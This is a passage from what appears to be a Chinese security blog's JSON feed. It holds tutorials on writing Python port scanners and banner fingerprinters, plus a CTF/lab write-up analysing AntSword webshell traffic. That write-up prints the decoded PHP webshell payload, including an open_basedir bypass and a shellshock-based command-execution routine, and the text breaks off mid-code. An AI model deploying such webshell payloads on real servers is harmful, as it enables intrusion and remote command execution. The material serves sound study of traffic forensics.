print(&quot;Scan report for &quot;+ip+&quot;\\n&quot;)</span><br><span class=\"line\">    for line in port.split(&#x27;,&#x27;):</span><br><span class=\"line\">        request(ip,line)</span><br><span class=\"line\">        time.sleep(0.2)</span><br><span class=\"line\">    print(&quot;\\nScan finished!...\\n&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        main()</span><br><span class=\"line\">    except KeyboardInterrupt:</span><br><span class=\"line\">        print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>在 request () 函数中，首先调用 sock.connect () 函数探测目标主机的端口是否开放，如果端口开放，则利用 sock.sendall () 函数将 PROBE 探针发送给目标端口。sock.recv () 函数用于接收返回的指纹信息，并将指纹信息及端口发送到 regex () 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def request(ip,port):</span><br><span class=\"line\">    response = &#x27;&#x27;</span><br><span class=\"line\">    PROBE = &#x27;GET / HTTP/1.0\\r\\n\\r\\n&#x27;</span><br><span class=\"line\">    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">    sock.settimeout(10)</span><br><span class=\"line\">    result = sock.connect_ex((ip,int(port)))</span><br><span class=\"line\">    if result == 0:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            sock.sendall(PROBE.encode())</span><br><span class=\"line\">            response = sock.recv(256)</span><br><span class=\"line\">            if response:</span><br><span class=\"line\">                regex(response,port)</span><br><span class=\"line\">        except(ConnectionResetError,socket.timeout):</span><br><span class=\"line\">           pass</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure></p>\n<p>利用 re.search () 函数将返回的 banner 信息与 SIGNS 包含的指纹信息进行正则匹配，并将匹配到的结果输出。如果没有在 SIGNS 中找到想匹配的信息，则输出 Unrecognized</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def regex(response,port):</span><br><span class=\"line\">    text = &quot;&quot;</span><br><span class=\"line\">    if re.search(b&#x27;&lt;title&gt;502 Bad Geteway&#x27;,response):</span><br><span class=\"line\">        proto = &#123;&quot;Service failed to access!!&quot;&#125;</span><br><span class=\"line\">    for pattern in SIGNS:</span><br><span class=\"line\">        pattern = pattern.split(b&#x27;|&#x27;)</span><br><span class=\"line\">        if re.search(pattern[-1],response,re.IGNORECASE):</span><br><span class=\"line\">            proto = &quot;[&quot;+port+&quot;]&quot;+&quot;open&quot;+pattern[1].decode()</span><br><span class=\"line\">            break</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            proto = &quot;[&quot;+port+&quot;]&quot;+&quot;open&quot;+&quot;Unrecognized&quot;</span><br><span class=\"line\">        print(proto)</span><br></pre></td></tr></table></figure></p>\n<p>市面上的软件种类繁多，版本也不一样，因此端口服务版本要想实现比较困难，</p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/",
            "title": "主动信息收集------端口探测",
            "date_published": "2024-04-16T05:58:19.062Z",
            "content_html": "<blockquote>\n<p>端口是设备与外界通信交流的接口，如果把服务器看作一栋房子，那么端口就是可以进出这栋房子的门。真正的房子只有一个或者几个门，但是服务器至多可以有 65536 个门。不同的端口指向不同的服务，就像不同的门对应不同的房间<br />\n最常见的三个服务端口就是 80、21、3389，分别对应的是浏览网页时涉及的 www 服务，上传和下载文件的服务，远程桌面的服务。如果入侵者想要控制这个服务器，那么肯定得先通过一个端口进入该服务，就如同控制房子首先得通过门进入房间一样，因此，在信息的收集阶段，端口的扫描就尤为重要</p>\n</blockquote>\n<p>这里使用 python 的 socket 模块来进行端口扫描的编写，先导入需要用到的模块</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import optparse</span><br><span class=\"line\">import threading</span><br><span class=\"line\">import queque</span><br></pre></td></tr></table></figure></p>\n<p>接着编写一个端口扫描类，继承 threading.Thread。这个类需要传递 3 个参数，分别是目标 IP、端口队列、超时时间，通过这个类来创造多个子线程来加快扫描速度</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 端口扫描类,继承threading.Thread</span><br><span class=\"line\">class PortScaner(threading.Thread):</span><br><span class=\"line\">    def __init__(self, portqueue, ip, timeout=3):</span><br><span class=\"line\">        threading.Thread.__init__(self)</span><br><span class=\"line\">        self._potqueue = portqueue</span><br><span class=\"line\">        self._ip = ip</span><br><span class=\"line\">        self._timeout = timeout</span><br><span class=\"line\"></span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            # 判断端口队列是否为空</span><br><span class=\"line\">            if self._portqueue.empty():</span><br><span class=\"line\">                # 端口队列为空，说明已经扫描完毕，跳出循环</span><br><span class=\"line\">                break</span><br><span class=\"line\">            # 从端口队列中取出端口，超时时间为1s</span><br><span class=\"line\">            port = self._portqueue.get(timeout=0.5)</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">                s.settimeout(self._timeout)</span><br><span class=\"line\">                result_code = s.connect_ex((self._ip, port))</span><br><span class=\"line\">                # sys.stdout.write(&quot;[%d]Scan\\n&quot;%port)</span><br><span class=\"line\">                # 若端口开放，则会返回0</span><br><span class=\"line\">                if result_code == 0:</span><br><span class=\"line\">                    sys.stdout.write(&quot;[%d] OPEN\\n&quot; % port)</span><br><span class=\"line\">            except Exception as e:</span><br><span class=\"line\">                print(e)</span><br><span class=\"line\">            finally:</span><br><span class=\"line\">                s.close()</span><br></pre></td></tr></table></figure></p>\n<p>编写一个函数，根据用户的参数来指定目标 IP、端口队列的生成以及子线程的生成，同时能支持单个端口的扫描和范围端口的扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def StartScan(targetip, port, threadNum):</span><br><span class=\"line\">    # 端口列表</span><br><span class=\"line\">    portList = []</span><br><span class=\"line\">    portNumb = port</span><br><span class=\"line\">    # 判断是单个端口还是范围端口</span><br><span class=\"line\">    if &#x27;-&#x27; in port:</span><br><span class=\"line\">        for i in range(int(port.split(&#x27;-&#x27;)[0]), int(port.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            portList.append(i)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        portList.append(int(port))</span><br><span class=\"line\">    # 目标IP地址</span><br><span class=\"line\">    ip = targetip</span><br><span class=\"line\">    # 线程列表</span><br><span class=\"line\">    threads = []</span><br><span class=\"line\">    # 线程数量</span><br><span class=\"line\">    threadNumber = threadNum</span><br><span class=\"line\">    # 端口队列</span><br><span class=\"line\">    portQueue = queue.Queue()</span><br><span class=\"line\">    # 生成端口，加入端口队列</span><br><span class=\"line\">    for port in portList:</span><br><span class=\"line\">        portQueue.put(port)</span><br><span class=\"line\">    for t in range(threadNumber):</span><br><span class=\"line\">        threads.append(PortScaner(portQueue, ip, timeout=3))</span><br><span class=\"line\">    # 启动线程</span><br><span class=\"line\">    for thread in threads:</span><br><span class=\"line\">        thread.start()</span><br><span class=\"line\">    # 阻塞线程</span><br><span class=\"line\">    for thread in threads:</span><br><span class=\"line\">        thread.join()</span><br></pre></td></tr></table></figure></p>\n<p>编写主函数来指定参数的规则</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = optparse.OptionParser(&#x27;Example:python %prog -i 127.0.0.1 -p 80 \\n python %prog -i 127.0.0.1 -p 1-100\\n&#x27;)</span><br><span class=\"line\">    # 目标IP参数-i</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;, &#x27;--ip&#x27;, dest=&#x27;targetIP&#x27;, default=&#x27;127.0.0.1&#x27;, type=&#x27;string&#x27;, help=&#x27;target IP&#x27;)</span><br><span class=\"line\">    # 添加端口参数-p</span><br><span class=\"line\">    parser.add_option(&#x27;-p&#x27;, &#x27;--port&#x27;, dest=&#x27;port&#x27;, default=&#x27;80&#x27;, type=&#x27;string&#x27;, help=&#x27;scann port&#x27;)</span><br><span class=\"line\">    # 线程数量参数-t</span><br><span class=\"line\">    parser.add_option(&#x27;-t&#x27;, &#x27;--thread&#x27;, dest=&#x27;threadNum&#x27;, default=100, type=&#x27;int&#x27;, help=&#x27;scann thread number&#x27;)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\">StartScan(options.targetIP, options.port, options.threadNum)</span><br></pre></td></tr></table></figure></p>\n<p>接下来用自己的服务器测试一下开放端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./ce.py -i ip -p 端口</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7vUkGrUiTBOK48Ag.png!thumbnail\" alt=\"\" /></p>\n<p>这是测试单个端口的开放，也同时可以设置多线程跑范围端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./ce.py -i ip -p 1-3500 -t 100</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/62ddNYx8s5Zy4KAq.png!thumbnail\" alt=\"\" /></p>\n<p>同时也可以使用 nmap 库来修改工具进行端口扫描，所需修改的部分代码：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = nm.scan(hosts=targetIP,arguments=&#x27;-p&#x27;+str(targetPort))</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "蚁剑流量浅析",
            "date_published": "2024-04-16T05:58:19.061Z",
            "content_html": "<p>最近回顾了一道蚁剑的流量分析题目，就像借着这个机会记录一下学习内容</p>\n<p>先看题目</p>\n<blockquote>\n<p>题目是 2022DASCTF Apr X FATE 防疫挑战赛的流量分析题</p>\n</blockquote>\n<p>首先打开流量包，查看下 tcp 追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BrLogKUK1bDSvRZr.png!thumbnail\" alt=\"\" /></p>\n<p>发现了流 52 有带有 flag.txt 字样的 zip</p>\n<p>可以手动分离也可以 binwalk 或者 foremost，分离出压缩包发现是加密的</p>\n<p>那就需要找到压缩包密码，去看看之前的追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UGnmP5f9GfMOWbOv.png!thumbnail\" alt=\"\" /></p>\n<p>在流 50 找到了压缩包的加密过程，解码上面的密文进行阅读分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9nPVl560teeyA72N.png!thumbnail\" alt=\"\" /></p>\n<p>在这里发现了压缩包的密码 PaSsZiPWorD</p>\n<p>解压压缩包得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4pRBtAmR7ryLDMEa.png!thumbnail\" alt=\"\" /></p>\n<p><strong>DASCTF{f3f32f434eddbc6e6b5043373af95ae8}</strong></p>\n<p>题目做完了就想着自己去截取流量分析一下，于是就在 ctfshow 开了一个文件上传的环境</p>\n<p>成功将马上传了之后使用蚁剑 getshell，这里是不使用任何的加密方式，采用蚁剑的虚拟终端敲了两个命令来获取 flag，截取流量进行分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5nse7uTKfmarqikw.png!thumbnail\" alt=\"\" /></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uKWFk0WTCHMdIyDo.png!thumbnail\" alt=\"\" /></p>\n<p>wireshark 捕获设置为 WLAN 之后点击开始，截取之后进行分析</p>\n<p>tcp 流 22：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZNH5ygLPLBzjGR5c.png!thumbnail\" alt=\"\" /></p>\n<p>发现成功截取</p>\n<p>观察 tcp 追踪流，这里也显示了蚁剑流量的一个明显的特征：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=@ini_set(&quot;display_errors&quot;, &quot;0&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>这个在蚁剑当中是以明文的方式出现的，而其他的 webshell 管理工具一般会进行加密，继续分析，这里是蚁剑中虚拟终端输入的第一个命令<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2ia6d6zo2vGm9RB1.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>将该流的这个 base64 解码能够看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1PFy377d6fTcYlVm.png!thumbnail\" alt=\"\" /></p>\n<p>可以看到后面的流一样显示截取的蚁剑流量</p>\n<p>tcp 流 33：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1W9vgNWmiVUPrsLx.png!thumbnail\" alt=\"\" /></p>\n<p>该流就是输入的第二个命令了，就不演示解码了，同时在 http 流能够看到 cat<br />\nflag.php 之后的具体内容</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vgvaL6WS3qnbyt6j.png!thumbnail\" alt=\"\" /></p>\n<p>同样的</p>\n<p>继续使用 base64 加解密的方式对数据进行数据处理试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AX7a0hdjCIhiohFQ.png!thumbnail\" alt=\"\" /></p>\n<p>保存数据，用虚拟终端输入命令获取 flag 进行测试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YLmJEgedd3h8dOmk.png!thumbnail\" alt=\"\" /></p>\n<p>可以仔细看看加密之后的一整串 base64 解码之后的样子，这里以 tcp 流 5 为例</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q6Gf7Y2aPhC0KeeW.png!thumbnail\" alt=\"\" /></p>\n<p>进行解码得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jhtAGxmT8JxJ9qmp.png!thumbnail\" alt=\"\" /></p>\n<p>方便查看可以格式化一下代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">$opdir=@ini_get(&quot;open_basedir&quot;);</span><br><span class=\"line\">if($opdir) &#123;</span><br><span class=\"line\">\t$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t$oparr=preg_split(&quot;/;|:/&quot;,$opdir);</span><br><span class=\"line\">\t@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class=\"line\">\tforeach($oparr as $item) &#123;</span><br><span class=\"line\">\t\tif(!@is_writable($item)) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t;</span><br><span class=\"line\">\t\t$tmdir=$item.&quot;/.6a33b73913&quot;;</span><br><span class=\"line\">\t\t@mkdir($tmdir);</span><br><span class=\"line\">\t\tif(!@file_exists($tmdir)) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t@chdir($tmdir);</span><br><span class=\"line\">\t\t@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class=\"line\">\t\t$cntarr=@preg_split(&quot;/\\\\\\\\|\\//&quot;,$tmdir);</span><br><span class=\"line\">\t\tfor ($i=0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class=\"line\">\t\t\t@chdir(&quot;..&quot;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t;</span><br><span class=\"line\">\t\t@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);</span><br><span class=\"line\">\t\t@rmdir($tmdir);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">;</span><br><span class=\"line\">function asenc($out) &#123;</span><br><span class=\"line\">\treturn @base64_encode($out);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">function asoutput() &#123;</span><br><span class=\"line\">\t$output=ob_get_contents();</span><br><span class=\"line\">\tob_end_clean();</span><br><span class=\"line\">\techo &quot;95&quot;.&quot;44e&quot;;</span><br><span class=\"line\">\techo @asenc($output);</span><br><span class=\"line\">\techo &quot;1911&quot;.&quot;b6c9&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ob_start();</span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">\t$p=base64_decode(substr($_POST[&quot;ka199f64875418&quot;],2));</span><br><span class=\"line\">\t$s=base64_decode(substr($_POST[&quot;n7573f80f63f59&quot;],2));</span><br><span class=\"line\">\t$envstr=@base64_decode(substr($_POST[&quot;w2b059d24e126c&quot;],2));</span><br><span class=\"line\">\t$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;</span><br><span class=\"line\">\tif(substr($d,0,1)==&quot;/&quot;) &#123;</span><br><span class=\"line\">\t\t@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\t@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif(!empty($envstr)) &#123;</span><br><span class=\"line\">\t\t$envarr=explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class=\"line\">\t\tforeach($envarr as $v) &#123;</span><br><span class=\"line\">\t\t\tif (!empty($v)) &#123;</span><br><span class=\"line\">\t\t\t\t@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class=\"line\">\tfunction fe($f) &#123;</span><br><span class=\"line\">\t\t$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class=\"line\">\t\tif(empty($d)) &#123;</span><br><span class=\"line\">\t\t\t$d=array();</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\tfunction runshellshock($d, $c) &#123;</span><br><span class=\"line\">\t\tif (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;</span><br><span class=\"line\">\t\t\tif (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;</span><br><span class=\"line\">\t\t\t\t$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);</span><br><span class=\"line\">\t\t\t\tputenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class=\"line\">\t\t\t\tif (fe(&#x27;error_log&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t\t\terror_log(&quot;a&quot;, 1);</span><br><span class=\"line\">\t\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\t\tmail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\treturn False;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t$output = @file_get_contents($tmp);</span><br><span class=\"line\">\t\t\t@unlink($tmp);</span><br><span class=\"line\">\t\t\tif ($output != &quot;&quot;) &#123;</span><br><span class=\"line\">\t\t\t\tprint($output);</span><br><span class=\"line\">\t\t\t\treturn True;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn False;</span><br><span class=\"line\">\t&#125;</span><br><span 